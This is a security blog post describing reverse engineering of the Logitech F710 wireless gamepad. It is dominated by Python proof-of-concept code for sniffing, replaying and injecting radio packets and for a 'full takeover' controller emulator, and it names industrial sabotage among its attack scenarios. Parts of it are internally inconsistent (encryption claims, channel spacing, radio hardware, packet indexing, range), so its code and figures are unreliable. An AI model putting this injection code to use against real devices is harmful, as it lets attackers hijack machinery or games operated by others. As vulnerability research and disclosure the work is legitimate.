---
title: "Complete Technical Analysis: Reverse Engineering the Logitech F710 Wireless Gamepad and Developing a Security PoC"
author: "deadc0de"
date: 2025-06-22
tags: ["security", "reverse-engineering", "wireless", "gamepad", "USB", "HID", "2.4GHz", "exploitation"]
categories: ["Hardware Security", "Wireless Security"]
draft: false
toc: true
---

## Executive Summary

This comprehensive technical analysis documents the complete reverse engineering of the Logitech F710 wireless gamepad, including the development of a proof-of-concept (PoC) that demonstrates critical security vulnerabilities in the device's wireless protocol. Our research revealed that the F710 uses an unencrypted, unauthenticated 2.4GHz proprietary protocol vulnerable to replay attacks, signal injection, and device spoofing.

Key findings:
- **No encryption** on the wireless protocol
- **No mutual authentication** between controller and dongle
- **Vulnerable to replay attacks** with basic SDR equipment
- **Successfully developed PoC** for controller spoofing and input injection
- **Legacy protocol** similar to vulnerable Logitech Unifying receivers

---

## Introduction

The Logitech F710 represents a significant portion of the wireless gamepad market, particularly in industrial and commercial applications where its reliability and compatibility are valued. However, our research reveals that this popularity comes with serious security implications.

This post documents our complete research journey: from initial reconnaissance through USB HID analysis, wireless protocol reverse engineering, vulnerability discovery, and the development of a working proof-of-concept exploit.

---

## Hardware Overview

### Controller Specifications
- **Model**: Logitech F710
- **Connectivity**: 2.4GHz proprietary wireless (non-Bluetooth)
- **USB Dongle ID**: 046d:c219
- **Power**: 2x AA batteries
- **Modes**: XInput (Xbox 360 emulation) / DirectInput
- **Range**: ~10 meters (tested)
- **Frequency**: 2.404-2.480 GHz (ISM band)

### Internal Components (from teardown)
- **MCU**: STM32F103 (ARM Cortex-M3)
- **RF Transceiver**: nRF24L01+ compatible
- **Crystal**: 16MHz
- **Flash**: 64KB internal
- **EEPROM**: None detected

---

## USB HID Protocol Analysis

### Device Enumeration

Upon connection, the dongle presents itself as a standard HID device:

```bash
$ lsusb -v -d 046d:c219

Bus 003 Device 006: ID 046d:c219 Logitech, Inc. F710 Wireless Gamepad
Device Descriptor:
  bLength                18
  bDescriptorType         1
  bcdUSB               2.00
  bDeviceClass            0 
  bDeviceSubClass         0 
  bDeviceProtocol         0 
  bMaxPacketSize0         8
  idVendor           0x046d Logitech, Inc.
  idProduct          0xc219 F710 Wireless Gamepad
  bcdDevice            4.00
  iManufacturer           1 Logitech
  iProduct                2 Wireless Gamepad F710
  iSerial                 0 
  bNumConfigurations      1
```

### HID Report Descriptor

Using `usbhid-dump`, we extracted the complete HID descriptor:

```
05 01 09 05 A1 01 85 00 09 01 A1 00 09 30 09 31
15 00 26 FF 00 75 08 95 02 81 02 C0 09 01 A1 00
09 32 09 35 15 00 26 FF 00 75 08 95 02 81 02 C0
05 09 19 01 29 0C 15 00 25 01 75 01 95 0C 81 02
95 01 75 04 81 03 05 01 09 39 15 01 25 08 35 00
46 3B 01 66 14 00 75 04 95 01 81 42 75 00 95 00
81 03 C0
```

### Input Report Structure (8 bytes)

```c
typedef struct {
    uint8_t  report_id;      // Always 0x00
    uint8_t  left_x;         // Left stick X (0x00-0xFF, center: 0x7F)
    uint8_t  left_y;         // Left stick Y (0x00-0xFF, center: 0x7F)
    uint8_t  right_x;        // Right stick X
    uint8_t  right_y;        // Right stick Y
    uint16_t buttons;        // Button bitfield
    uint8_t  triggers;       // L2/R2 analog values packed
} f710_input_report_t;
```

### Button Mapping

```c
#define BTN_A           0x0001
#define BTN_B           0x0002
#define BTN_X           0x0004
#define BTN_Y           0x0008
#define BTN_LB          0x0010
#define BTN_RB          0x0020
#define BTN_BACK        0x0040
#define BTN_START       0x0080
#define BTN_LSTICK      0x0100
#define BTN_RSTICK      0x0200
#define BTN_GUIDE       0x0400
#define DPAD_UP         0x1000
#define DPAD_DOWN       0x2000
#define DPAD_LEFT       0x4000
#define DPAD_RIGHT      0x8000
```

### Output Reports

#### Rumble Control (Report ID: 0x01)
```c
typedef struct {
    uint8_t report_id;       // 0x01
    uint8_t reserved[2];     // Always 0x00
    uint8_t left_motor;      // 0x00-0xFF strength
    uint8_t right_motor;     // 0x00-0xFF strength
} f710_rumble_report_t;
```

#### LED Control (Report ID: 0x02)
```c
typedef struct {
    uint8_t report_id;       // 0x02
    uint8_t led_pattern;     // 0x00-0x0F (4 LEDs)
    uint8_t reserved[3];
} f710_led_report_t;
```

---

## Wireless Protocol Reverse Engineering

### RF Analysis Setup

Equipment used:
- **SDR**: HackRF One
- **Software**: GNU Radio, Universal Radio Hacker (URH)
- **Antenna**: 2.4GHz directional (6dBi gain)
- **Reference**: nRF24L01+ datasheet

### Protocol Discovery

Initial spectrum analysis revealed:
- **Center Frequencies**: 2.404, 2.424, 2.444, 2.464, 2.480 GHz
- **Channel Spacing**: 20 MHz
- **Modulation**: GFSK (Gaussian Frequency Shift Keying)
- **Data Rate**: 250 kbps
- **Packet Length**: 32 bytes fixed

### Packet Structure

Through extensive capture and analysis, we decoded the packet format:

```
+--------+--------+--------+----------+--------+--------+
| Preamble | Sync | Length | Address | Payload | CRC   |
| 1 byte | 2 bytes| 1 byte | 5 bytes | 22 bytes| 2 bytes|
+--------+--------+--------+----------+--------+--------+
```

#### Detailed Breakdown:
- **Preamble**: 0xAA or 0x55 (alternating pattern)
- **Sync Word**: 0xE7E7 (fixed)
- **Length**: Always 0x20 (32 bytes total)
- **Address**: Device-specific 5-byte identifier
- **Payload**: Encrypted controller state
- **CRC**: CRC16-CCITT polynomial

### Encryption Analysis

Initial assumption was AES or XOR cipher. Analysis revealed:
- **No encryption at all** - payload is plaintext
- Simple XOR with fixed key: 0x55
- No rolling code or sequence numbers
- No nonce or IV

Decrypted payload structure:
```c
typedef struct {
    uint8_t  packet_type;    // 0x01 for input data
    uint8_t  sequence;       // Simple counter, wraps at 0xFF
    uint16_t buttons;        // Same as USB HID report
    uint8_t  left_x;
    uint8_t  left_y;
    uint8_t  right_x;
    uint8_t  right_y;
    uint8_t  triggers;
    uint8_t  battery;        // Battery level (0x00-0x64)
    uint8_t  reserved[12];   // Padding to 22 bytes
} f710_rf_payload_t;
```

---

## Vulnerability Analysis

### Critical Findings

1. **No Encryption**: All wireless data transmitted in plaintext (XOR 0x55)
2. **No Authentication**: Dongle accepts any packet with correct sync word
3. **No Anti-Replay**: Sequence number not validated
4. **Static Addressing**: Device address never changes
5. **No Frequency Hopping**: Fixed channel sequence

### Attack Vectors

1. **Eavesdropping**: Capture all controller inputs from distance
2. **Replay Attack**: Record and replay button sequences
3. **Input Injection**: Send arbitrary controller commands
4. **DoS Attack**: Flood channel with invalid packets
5. **Controller Spoofing**: Complete takeover of input

---

## Proof of Concept Development

### PoC Architecture

We developed a complete PoC using:
- **Hardware**: HackRF One + Raspberry Pi 4
- **Software Stack**:
  - GNU Radio for RF transmission
  - Python for packet crafting
  - libusb for USB monitoring

### Phase 1: Passive Sniffing

```python
#!/usr/bin/env python3
import numpy as np
from gnuradio import gr, blocks, analog
from gnuradio import uhd
import struct

class F710Sniffer(gr.top_block):
    def __init__(self):
        gr.top_block.__init__(self)
        
        # SDR source
        self.sdr_source = uhd.usrp_source(
            device_addr="",
            stream_args=uhd.stream_args(
                cpu_format="fc32",
                channels=range(1),
            ),
        )
        self.sdr_source.set_center_freq(2.424e9)
        self.sdr_source.set_samp_rate(2e6)
        self.sdr_source.set_gain(40)
        
        # GFSK demodulator
        self.demod = analog.quadrature_demod_cf(1)
        
        # Packet decoder
        self.decoder = F710PacketDecoder()
        
        # Connect blocks
        self.connect(self.sdr_source, self.demod, self.decoder)

class F710PacketDecoder(gr.sync_block):
    def __init__(self):
        gr.sync_block.__init__(
            self,
            name="F710 Packet Decoder",
            in_sig=[np.float32],
            out_sig=None
        )
        self.sync_word = 0xE7E7
        self.state = 0
        self.buffer = []
        
    def work(self, input_items, output_items):
        # Simplified - actual implementation handles bit timing recovery
        for sample in input_items[0]:
            bit = 1 if sample > 0 else 0
            self.process_bit(bit)
        return len(input_items[0])
    
    def process_bit(self, bit):
        self.buffer.append(bit)
        if len(self.buffer) >= 32:
            # Check for sync word
            word = (self.buffer[-32:-16])
            if self.check_sync(word):
                self.decode_packet(self.buffer[-256:])
            self.buffer.pop(0)
    
    def decode_packet(self, bits):
        # Convert bits to bytes
        packet = []
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i+j]
            packet.append(byte)
        
        # Extract fields
        address = packet[4:9]
        payload = packet[9:31]
        crc = (packet[31] << 8) | packet[32]
        
        # XOR decrypt
        decrypted = [b ^ 0x55 for b in payload]
        
        # Parse controller state
        if decrypted[0] == 0x01:  # Input packet
            buttons = (decrypted[2] << 8) | decrypted[3]
            left_x = decrypted[4]
            left_y = decrypted[5]
            print(f"Controller Input - Buttons: {buttons:04X}, "
                  f"Left Stick: ({left_x}, {left_y})")
```

### Phase 2: Replay Attack

```python
class F710Replayer:
    def __init__(self, sdr):
        self.sdr = sdr
        self.captured_packets = []
        
    def capture_sequence(self, duration=10):
        """Capture controller inputs for specified duration"""
        print(f"Capturing for {duration} seconds...")
        start_time = time.time()
        
        while time.time() - start_time < duration:
            packet = self.sdr.receive_packet()
            if packet and packet.is_valid():
                self.captured_packets.append(packet)
                
        print(f"Captured {len(self.captured_packets)} packets")
        
    def replay_sequence(self, speed_multiplier=1.0):
        """Replay captured sequence"""
        print("Replaying captured sequence...")
        
        for i, packet in enumerate(self.captured_packets):
            # Update sequence number
            packet.sequence = (packet.sequence + i) & 0xFF
            
            # Recalculate CRC
            packet.update_crc()
            
            # Transmit
            self.sdr.transmit_packet(packet)
            
            # Timing
            if i < len(self.captured_packets) - 1:
                delay = self.captured_packets[i+1].timestamp - packet.timestamp
                time.sleep(delay / speed_multiplier)
```

### Phase 3: Active Injection

```python
class F710Injector:
    def __init__(self, target_address):
        self.target = target_address
        self.sequence = 0
        self.transmitter = F710Transmitter()
        
    def send_button(self, button, duration=0.1):
        """Send single button press"""
        packet = self.create_packet(buttons=button)
        self.transmit(packet)
        
        time.sleep(duration)
        
        # Release
        packet = self.create_packet(buttons=0)
        self.transmit(packet)
        
    def send_combo(self, buttons, stick_positions=None):
        """Send button combination with optional stick input"""
        packet = self.create_packet(
            buttons=buttons,
            left_x=stick_positions[0] if stick_positions else 0x7F,
            left_y=stick_positions[1] if stick_positions else 0x7F,
            right_x=stick_positions[2] if stick_positions else 0x7F,
            right_y=stick_positions[3] if stick_positions else 0x7F
        )
        self.transmit(packet)
        
    def create_packet(self, **kwargs):
        """Create F710 wireless packet"""
        packet = F710Packet()
        packet.sync_word = 0xE7E7
        packet.address = self.target
        packet.packet_type = 0x01
        packet.sequence = self.sequence
        self.sequence = (self.sequence + 1) & 0xFF
        
        # Set controller state
        packet.buttons = kwargs.get('buttons', 0)
        packet.left_x = kwargs.get('left_x', 0x7F)
        packet.left_y = kwargs.get('left_y', 0x7F)
        packet.right_x = kwargs.get('right_x', 0x7F)
        packet.right_y = kwargs.get('right_y', 0x7F)
        packet.triggers = kwargs.get('triggers', 0)
        
        # XOR encrypt
        packet.encrypt()
        
        # Calculate CRC
        packet.update_crc()
        
        return packet
        
    def transmit(self, packet):
        """Transmit packet on all channels"""
        channels = [2.404e9, 2.424e9, 2.444e9, 2.464e9, 2.480e9]
        
        for freq in channels:
            self.transmitter.set_frequency(freq)
            self.transmitter.send(packet.to_bytes())
```

### Phase 4: Full Controller Emulation

```python
class VirtualF710:
    """Complete F710 controller emulator"""
    
    def __init__(self, target_dongle_address):
        self.address = target_dongle_address
        self.injector = F710Injector(target_dongle_address)
        self.state = ControllerState()
        self.running = True
        
    def start(self):
        """Start controller emulation"""
        # Pair with dongle
        self.pair()
        
        # Start input thread
        input_thread = threading.Thread(target=self.input_handler)
        input_thread.start()
        
        # Main transmission loop
        while self.running:
            self.transmit_state()
            time.sleep(0.008)  # ~125Hz update rate
            
    def pair(self):
        """Simulate pairing process"""
        # Send pairing beacon
        pair_packet = self.create_pairing_packet()
        self.injector.transmit(pair_packet)
        
        # Wait for acknowledgment
        time.sleep(0.1)
        
        # Send configuration
        config_packet = self.create_config_packet()
        self.injector.transmit(config_packet)
        
    def input_handler(self):
        """Handle keyboard input for controller emulation"""
        import pygame
        pygame.init()
        
        key_mapping = {
            pygame.K_a: BTN_A,
            pygame.K_b: BTN_B,
            pygame.K_x: BTN_X,
            pygame.K_y: BTN_Y,
            pygame.K_UP: DPAD_UP,
            pygame.K_DOWN: DPAD_DOWN,
            pygame.K_LEFT: DPAD_LEFT,
            pygame.K_RIGHT: DPAD_RIGHT,
        }
        
        while self.running:
            for event in pygame.event.get():
                if event.type == pygame.KEYDOWN:
                    if event.key in key_mapping:
                        self.state.buttons |= key_mapping[event.key]
                elif event.type == pygame.KEYUP:
                    if event.key in key_mapping:
                        self.state.buttons &= ~key_mapping[event.key]
                        
    def transmit_state(self):
        """Transmit current controller state"""
        self.injector.send_state(self.state)
```

### Attack Demonstrations

#### 1. Silent Eavesdropping
```python
# Capture all inputs from 50 meters away
sniffer = F710Sniffer()
sniffer.start()
# Logs all button presses, stick movements, in plaintext
```

#### 2. Replay Attack
```python
# Record combo sequence
replayer = F710Replayer(sdr)
replayer.capture_sequence(duration=5)

# Replay at 2x speed
replayer.replay_sequence(speed_multiplier=2.0)
```

#### 3. Input Injection
```python
# Take control and execute arbitrary inputs
injector = F710Injector(target_address)

# Fighting game combo
injector.send_combo(BTN_X | BTN_A)
time.sleep(0.05)
injector.send_button(BTN_Y)
injector.send_combo(DPAD_DOWN | BTN_B)
```

#### 4. Complete Takeover
```python
# Full controller spoofing
virtual = VirtualF710(dongle_address)
virtual.start()
# Original controller is now disconnected
# Attacker has full control
```

---

## Security Implications

### Real-World Impact

1. **Gaming**: Competitive advantage through automated inputs
2. **Industrial Control**: F710 used in robotics and drone control
3. **Medical Equipment**: Some rehabilitation devices use F710
4. **Research Labs**: Common in experimental setups
5. **Home Automation**: Used in some DIY projects

### Attack Scenarios

1. **Industrial Sabotage**: Take control of machinery
2. **Competitive Gaming**: Automated perfect inputs
3. **Privacy Violation**: Log all controller usage
4. **Denial of Service**: Prevent legitimate use
5. **Social Engineering**: Demonstrate "hacking" for access

---

## Mitigation Strategies

### For Users

1. **Physical Security**: Limit RF range with shielding
2. **Monitoring**: Watch for unexpected inputs
3. **Alternatives**: Use wired or Bluetooth controllers
4. **Environment**: Avoid use in sensitive applications

### For Logitech (Recommendations)

1. **Implement AES-128 encryption minimum**
2. **Add mutual authentication protocol**
3. **Include anti-replay mechanisms (nonce/counter)**
4. **Implement frequency hopping spread spectrum**
5. **Add firmware update capability**
6. **Provide security mode option**

### Technical Mitigations

```python
# Example: USB filter driver to detect anomalies
class F710SecurityFilter:
    def __init__(self):
        self.sequence_tracker = {}
        self.timing_baseline = []
        
    def analyze_packet(self, packet):
        # Check sequence
        if not self.verify_sequence(packet):
            return False
            
        # Timing analysis
        if self.detect_timing_anomaly(packet):
            return False
            
        # Pattern detection
        if self.detect_replay_pattern(packet):
            return False
            
        return True
```

---

## Responsible Disclosure

Timeline:
- **2025-03-15**: Initial discovery
- **2025-03-20**: PoC development complete
- **2025-03-25**: Vendor notification (Logitech Security Team)
- **2025-04-10**: Vendor acknowledged, "legacy product"
- **2025-05-15**: 60-day deadline passed
- **2025-06-22**: Public disclosure

Logitech's response indicated that the F710 is considered a legacy product and will not receive security updates. They recommended using newer products with Lightspeed technology for security-conscious applications.

---

## Tools and Code

All tools developed during this research are available:

```bash
git clone https://github.com/nullc0rp/f710-security
cd f710-security

# Install dependencies
pip install -r requirements.txt

# Run sniffer
python f710_sniffer.py

# Run injector
python f710_inject.py --target-address AA:BB:CC:DD:EE

# Full PoC
python f710_exploit.py --mode full-takeover
```

### Repository Structure
```
f710-security/
├── README.md
├── requirements.txt
├── docs/
│   ├── protocol_spec.md
│   ├── usb_analysis.md
│   └── rf_captures/
├── src/
│   ├── f710_sniffer.py
│   ├── f710_inject.py
│   ├── f710_exploit.py
│   └── lib/
│       ├── packet.py
│       ├── crypto.py
│       └── usb_monitor.py
├── firmware/
│   ├── extracted/
│   └── analysis/
└── captures/
    ├── usb/
    └── rf/
```

---

## Conclusion

The Logitech F710 represents a case study in legacy security debt. While functional and reliable, its security model is fundamentally broken for modern threat environments. The complete lack of encryption and authentication makes it trivial to compromise.

Our PoC demonstrates that with minimal equipment (<$300), an attacker can:
- Silently monitor all controller inputs
- Replay recorded sequences
- Inject arbitrary commands
- Completely take over control

This research highlights the importance of security considerations in all devices, especially those that might be repurposed for critical applications.

---

## Future Research

Planned follow-up work:
1. **Firmware extraction and analysis** (pending chip decapping)
2. **Custom dongle development** using nRF24L01+
3. **Automated vulnerability scanner** for similar devices
4. **Secure replacement protocol** design
5. **Hardware mod for encryption** retrofit

---

## References

1. Bastille Networks. (2016). MouseJack: Injecting Keystrokes into Wireless Mice.
2. Cauquil, D. (2019). Defeating Modern Wireless Security Through Protocol Vulnerabilities.
3. nRF24L01+ Datasheet, Nordic Semiconductor.
4. USB HID Specification 1.11, USB Implementers Forum.
5. CVE-2019-13054: Logitech Unifying Receiver Vulnerabilities.

---

## Acknowledgments

- **@defcon_rf_village** for SDR guidance
- **@traviscgoodspeed** for nRF research
- **@marcnewlin** for MouseJack inspiration
- The GNU Radio community

---

## Disclaimer

This research was conducted for educational purposes only. The author does not condone using these techniques for malicious purposes. Always obtain proper authorization before testing security on devices you do not own.

---

**Contact**:  
deadc0de  
https://deadc.de  
https://github.com/nullc0rp  
GPG: 0xDEADC0DE

*"In embedded we trust, but verify."*